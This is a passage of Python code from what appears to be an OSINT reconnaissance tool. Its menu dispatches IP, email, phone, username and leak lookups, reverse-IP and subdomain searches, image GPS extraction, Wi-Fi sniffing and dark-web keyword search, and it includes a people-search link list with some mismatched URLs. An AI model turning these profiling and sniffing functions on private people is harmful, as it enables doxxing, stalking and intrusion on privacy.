        except Exception as e:
            print(f"Error: {e}")
            pass
        
        print("\nData form > ip-api.com")
        try:
            print(f"""
---------------------------
IP Address     : {ip_info_ip_api['ip']}
Hostname       : {ip_info_ip_api['hostname']}
City           : {ip_info_ip_api['city']}
Region         : {ip_info_ip_api['region']}
Country        : {ip_info_ip_api['country']}
Location (Lat,Lon) : {ip_info_ip_api['loc']}
Postal Code    : {ip_info_ip_api['postal']}
Timezone       : {ip_info_ip_api['timezone']}
ISP / Org      : {ip_info_ip_api['org']}

For more info: {ip_info_ip_api['readme']}
            """)
        except Exception as e:
            print(f"Error: {e}")
            pass
        
        print("---------------------------")
        print("Data form > ipstack.com")
        print(ip_info_ip_stack)






    elif function == "2":
        email = input("Email: ")
        email_info = email_verification(email)
        try:
            print(f"FormatCheck: {email_info['formatCheck']}")
            print(f"SMTPCheck: {email_info['smtpCheck']}")
            print(f"DNSCheck: {email_info['dnsCheck']}")
        except KeyError:
            print("Invalid email format or API error.")
            exit()
        print(f"\nFree Email Checking")
        print(f"FreeCheck: {email_info['freeCheck']}")

        print("\nDisposable Email Checking")
        print(f"DisposableCheck: {email_info['disposableCheck']}")

        print(f'''
Email Information
Username        : {email_info['username']}
Domain          : {email_info['domain']}
Email Address   : {email_info['emailAddress']}
Catch-All Check : {email_info['catchAllCheck']}
MX Records      : {', '.join(email_info['mxRecords'])}

Audit Info
Created Date    : {email_info['audit']['auditCreatedDate']}
Updated Date    : {email_info['audit']['auditUpdatedDate']}
        ''')

    elif function == "3":
        domain = input("Domain: ")
        domain_info = domain_reputation(domain)

        # ดึง testResults ตัวแรกออกมา (เป็น list)
        test_result = domain_info['testResults'][0]
        warning = test_result['warnings'][0]

        print(f"""
Domain Reputation Report:
Mode             : {domain_info['mode']}
Reputation Score : {domain_info['reputationScore']}

Test Details
   • Test       : {test_result['test']}
   • Test Code  : {test_result['testCode']}

Warning
   • Description : {warning['warningDescription']}
   • Code        : {warning['warningCode']}
        """)

    elif function == "4":
        domain = input("Domain: ")
        ip_for_reverse_ip_lookup = socket.gethostbyname(domain)
        try:
            ip = socket.gethostbyname(domain)
            print(f"IP of {domain} is {ip_for_reverse_ip_lookup}")
        except socket.gaierror:
            print(f"Could not find IP of {domain}. Check if the domain is valid or connected to the internet.")

        ip = input("\nIP Address: ")
        reverse_ip_info = reverse_ip_lookup(ip)
        if isinstance(reverse_ip_info, list):
            # ถ้าเป็น list โดยตรงให้ใช้ข้อมูลจาก list นี้เลย
            records = reverse_ip_info  # ใช้ข้อมูลใน list ทั้งหมด
            count = len(records)  # นับจำนวนรายการทั้งหมด
            search_ip = "N/A"  # ตั้งค่า IP ที่ใช้ค้นหา

        else:
            # ถ้าเป็น dictionary (กรณีที่มี structure ตามปกติ)
            records = reverse_ip_info.get("result", {}).get("records", [])
            count = reverse_ip_info.get("result", {}).get("count", 0)
            search_ip = reverse_ip_info.get("search", "N/A")

        if records:
            print(f"""
        ===========================
        Reverse IP Lookup Results
        ===========================
        Target IP        : {search_ip}
        Total Domains    : {count}

        Top Record:
        ---------------------------
        Domain Name      : {records[0].get("domainName", "N/A")}
        First Seen       : {records[0].get("firstSeen", "N/A")}
        Last Seen        : {records[0].get("lastSeen", "N/A")}
        Still Resolving? : {records[0].get("currentDns", False)}
        ---------------------------

        All Records:
        ---------------------------""")

            for idx, rec in enumerate(records, start=1):
                print(f"""{idx}. {rec.get("domainName", "N/A")}
            ├─ First Seen : {rec.get("firstSeen", "N/A")}
            ├─ Last Seen  : {rec.get("lastSeen", "N/A")}
            └─ Active     : {rec.get("currentDns", False)}
        """)

        else:
            print(f"""
        ===========================
        Reverse IP Lookup Results
        ===========================
        Target IP        : {search_ip}
        ผลลัพธ์: ไม่พบโดเมนใดที่เคยชี้มายัง IP นี้
        """)

    elif function == "5":
        domain = input("Domain: ")
        subdomain_info = subdomain_lookup(domain)

        records = subdomain_info.get("result", {}).get("records", [])

        if records:
            first = records[0]
            print(f"""
        Subdomain Search Results:
        ---------------------------
        Search Query: {subdomain_info.get('search', 'N/A')}
        Total Records Found: {subdomain_info['result'].get('count', 'N/A')}

        Record Details:
        ---------------------------
        Domain: {first.get('domain', 'N/A')}
        First Seen: {first.get('firstSeen', 'N/A')}
        Last Seen: {first.get('lastSeen', 'N/A')}

        Timestamp (First Seen): {first.get('firstSeen', 'N/A')}
        Timestamp (Last Seen): {first.get('lastSeen', 'N/A')}
        ---------------------------
        """)
        else:
            print("There are no subdomains for this domain.")

    elif function == "6":
        
        folder_path = "country_phone_codes"  # ตรวจสอบโฟลเดอร์ country_phone_codes
        file_path = "country_phone_codes/country_phone_codes.txt"  # เส้นทางไฟล์ที่คุณต้องการเปิด

        if os.path.isdir(folder_path):  # ตรวจสอบว่าโฟลเดอร์มีอยู่จริงไหม
            print(Style.BRIGHT + Fore.GREEN + "Folder found" + Style.RESET_ALL)
            if os.path.isfile(file_path):  # ตรวจสอบว่าไฟล์มีอยู่จริงไหม
                with open(file_path, 'r') as file:
                    print(file.read())
            else:
                print("File not found")
        else:
            print("Folder not found")
        try:
            phone_number = input("Phone Number: ")
            phone_number = re.sub(r'\D', '', phone_number)  # ลบอักขระที่ไม่ใช่ตัวเลข
        except Exception as e:
            print(f"Error: {e}")
            break

        print("---------------------------")
        phone_number_lookup_apilayer(phone_number)
        print("---------------------------")
        phone_number_lookup_abstractAPI(phone_number)

    elif function == "7":
         # รับชื่อผู้ใช้หลายๆ ชื่อจากผู้ใช้
        usernames_input = input("Enter usernames separated by commas: ").strip()
        usernames = [username.strip() for username in usernames_input.split(',')]
    
    
        if not usernames_input:
            print("Please enter a valid username.")
        elif not all(is_valid_username(username) for username in usernames):
            print("Invalid username, it may contain spaces or invalid characters.")
        else:
            # ตรวจสอบชื่อผู้ใช้หลายชื่อ
            results = check_multiple_usernames(usernames)
            #
            # แสดงผลลัพธ์
            print("" + "\n".join(results))
            print("\n---------------------------")
            # บันทึกผลลัพธ์ลงไฟล์
            want_to_save = input("Do you want to save the results to a file? (y/n): ").strip().lower()
            if want_to_save == 'y' or want_to_save == 'yes' or want_to_save == 'Y' or want_to_save == 'Yes':
                
                # สร้างชื่อไฟล์ที่ไม่ซ้ำกันโดยใช้ timestamp
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                filename = f"Usernames_saves/{usernames_input}_results_{timestamp}.txt"
                if not os.path.exists("Usernames_saves"):
                    os.makedirs("Usernames_saves")  # สร้างโฟลเดอร์ 'Data' หากไม่มี

                with open(filename, "w", encoding="utf-8") as f:
                    # เขียนผลลัพธ์ลงในไฟล์ (แต่ละชื่อผู้ใช้ในบรรทัดใหม่)
                    f.write("\n".join(results))
    
                print(f"\nResults saved to file: {filename}")

            elif want_to_save == 'n' or want_to_save == 'no' or want_to_save == 'N' or want_to_save == 'No':
                print("Results not saved.")

            else:
                pass
            
    elif function == "8":
        email = input("Email: ")
        print("---------------------------")
        email_leak_lookup(email)

    elif function == "9":
        file_path = input("Enter the path to the file: ")
        extract_gps(file_path)


    elif function == "10":
        target_url = input("Enter url: ")
        scan_website(target_url)


    elif function == "11":
        wifi_lan()
        
        
    elif function == "12":
        print("""
        Dark Web Search Words
        คำค้นหาที่ใช้ใน Dark Web โดยทั่วไป
    ---------------------------------------
hacking forum	           ฟอรั่มเกี่ยวกับแฮ็กเกอร์, เครื่องมือ, เทคนิค
market	                   ตลาดมืด (.onion markets), ของเถื่อน, บริการ
drugs	                   เว็บไซต์เกี่ยวกับสารเสพติด (ผลลัพธ์อาจผิดกฎหมาย)
anonymous email	           บริการอีเมลไม่ระบุตัวตน
bitcoin mixer	           เว็บไซต์ผสมเหรียญเพื่อปกปิดแหล่งเงิน
hosting	                   บริการโฮสต์เว็บบน Tor
pastebin	               เว็บไซต์ที่คล้าย pastebin สำหรับโพสต์ข้อความลับ
chat	                   ระบบแชทนิรนามหรือเว็บบอร์ด
political leaks	           เอกสารหลุดจากรัฐบาล / องค์กร
whistleblower	           แพลตฟอร์มสำหรับแจ้งเบาะแส (เช่น SecureDrop)
library	                   แหล่งโหลดหนังสือ, บทความต้องห้าม ฯลฯ
     ---------------------------------------
""")
        word = input("Word: ")
        results = search_dark_web(word)
        print(Style.BRIGHT + Fore.CYAN + "อย่าลืมเปิด VPN + Tor" + Style.RESET_ALL)
        if not results:
            print("ไม่พบผลลัพธ์หรือ Ahmia บล็อกการเข้าถึง")
            
        else:
            for i, (title, url) in enumerate(results, 1):
                print(f"{i:03d}. {title}\n     {url}\n")
                print(f"\nพบ {len(results)} ลิงก์ .onion")

            want_to_save = input("\nDo you want to save the results to a file? (y/n): ").strip().lower()
            if want_to_save == 'y' or want_to_save == 'yes' or want_to_save == 'Y' or want_to_save == 'Yes':
                # สร้างชื่อไฟล์ที่ไม่ซ้ำกันโดยใช้ timestamp
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                filename = f"DarkWeb_saves/{word}_results_{timestamp}.txt"
                if not os.path.exists("DarkWeb_saves"):
                    os.makedirs("DarkWeb_saves")
                with open(filename, "w", encoding="utf-8") as f:
                    for i, (title, url) in enumerate(results, 1):
                        f.write(f"{i:03d}. {title}\n     {url}\n\n")
                print(Style.BRIGHT + Fore.GREEN + f"บันทึกผลลัพธ์ลงไฟล์ {filename} แล้ว" + Style.RESET_ALL)
            elif want_to_save == 'n' or want_to_save == 'no' or want_to_save == 'N' or want_to_save == 'No':
                print(Style.BRIGHT + Fore.RED + "ไม่บันทึกผลลัพธ์" + Style.RESET_ALL)
            else:
                print(Style.BRIGHT + Fore.RED + "ไม่บันทึกผลลัพธ์" + Style.RESET_ALL)


    elif function == "13":
        file_hash = check_file_integrity("path/to/your/file.txt")
        print(f"File Hash: {file_hash}")

    elif function == "14":
        short_url = input("Url: ")
        result = expand_url(short_url)
        print(result)

    elif function == "15":
        print("Sniffing Wi-Fi packets...")
        sniff_wifi()

    elif function == "16":
        random_name_generator()

    elif function == "pdr":
        pdr()
    elif function == "links" or function == "links" or function == "l":
        print("""
ชื่อเว็บไซต์	                ทำอะไรได้
Maigret	                    ตรวจ username ว่าใช้งานเว็บไหนบ้าง
Namechk	                    ตรวจสอบชื่อผู้ใช้ว่าใช้เว็บไหน
WhatsMyName	OSINT tool      ตรวจ username
Sherlock	                ตรวจ username ทั่วเว็บ (300+ เว็บ)
Spokeo	                    ค้นข้อมูลคนจากชื่อ/อีเมล/เบอร์
Social Searcher	            ค้นโพสต์และโปรไฟล์จากคำ
Hunter.io	                ค้นอีเมลจากชื่อโดเมน/โปรไฟล์ LinkedIn
Pipl	                    ค้นข้อมูลบุคคลจากชื่อ/อีเมล/เบอร์
PeekYou	                    หาโปรไฟล์โซเชียลจากชื่อหรือชื่อผู้ใช้
SocialLinks	OSINT           ระดับสูง (มี demo)
              

Website Name	                What It Does
Maigret	                        Checks where a username is used across many websites
Namechk	                        Checks username availability across social platforms
WhatsMyName	OSINT tool          to look up usernames across multiple sites
Sherlock	                    Searches a username across 300+ websites
Spokeo	                        Finds personal info from name, email, or phone number
Social Searcher	                Finds posts and profiles based on keywords
Hunter.io	                    Finds email addresses from domain names or LinkedIn profiles
Pipl	                        Searches personal data from name, email, or phone number
PeekYou	                        Finds social media profiles from name or username
SocialLinks	                    High-level OSINT platform (demo available)
Website Name	                What It Does

Maigret                         https://namechk.com/
Namechk                         https://github.com/soxoj/maigret
WhatsMyName	OSINT tool          https://www.namechk.com/
Sherlock                        https://github.com/sherlock-project/sherlock
Spokeo                          https://www.spokeo.com/
Social Searcher                 https://www.social-searcher.com/
Hunter.io                       https://www.hunter.io/
Pipl                            https://pipl.com/
PeekYou                         https://www.peekyou.com/
SocialLinks                     https://sociallinks.io/  
    """)


    elif function == "WIFI" or function == "wifi":
        print("""
        Liknks
        
ชื่อเว็ปไซต์

www.WiFimap.io
wifispc.com
wigle.net
        """)
    

    elif function == "0" or function == "exit" or function == "Exit":
        print("Exiting...")
        break
    elif function.lower() == "h" or function.lower() == "help" or function.lower() == "H" or function.lower() == "Help" or function.lower() == "?":
        banner()
        function_lists()
        exit()


    else:
        print("Invalid function selected.")
    
